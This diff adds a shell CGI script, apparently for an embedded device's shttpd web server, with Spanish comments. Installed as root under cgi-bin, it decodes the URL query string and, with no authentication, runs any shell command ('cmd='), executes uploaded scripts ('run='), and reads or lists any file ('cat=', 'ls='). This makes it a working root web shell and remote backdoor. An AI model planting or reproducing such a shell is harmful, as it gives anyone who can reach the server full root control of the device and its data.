@@ -1,0 +1,25 @@
+#!/bin/sh
+# CGI de root v2. Todo va con %XX y + decodificados, asi que basta una peticion:
+#   ?cmd=ls%20-l%2F              orden cualquiera
+#   ?run=/etc/shttpd/x.sh        script subido al docroot
+#   ?cat=/proc/mounts            leer fichero
+#   ?ls=/etc                     listar
+# Se instala en /etc/shttpd/cgi-bin/shell.cgi con chmod 755 (root).
+PATH=/usr/sbin:/usr/bin:/sbin:/bin
+export PATH
+printf 'Content-Type: text/plain; charset=utf-8\r\nCache-Control: no-store\r\n\r\n'
+q="$QUERY_STRING"
+if [ -z "$q" ]; then
+    echo "uid=$(sed -n '/^Uid:/p' /proc/self/status)"
+    echo "uptime=$(cat /proc/uptime)"
+    df -k /mnt/UDISK 2>&1
+    exit 0
+fi
+d=$(printf '%b' "$(printf '%s' "$q" | sed 's/+/ /g; s/%/\\x/g')")
+case "$d" in
+    cmd=*) sh -c "${d#cmd=}" 2>&1 ;;
+    run=*) sh "${d#run=}" 2>&1 ;;
+    cat=*) cat "${d#cat=}" 2>&1 ;;
+    ls=*)  ls -la "${d#ls=}" 2>&1 ;;
+    *)     echo "desconocido: $d" ;;
+esac
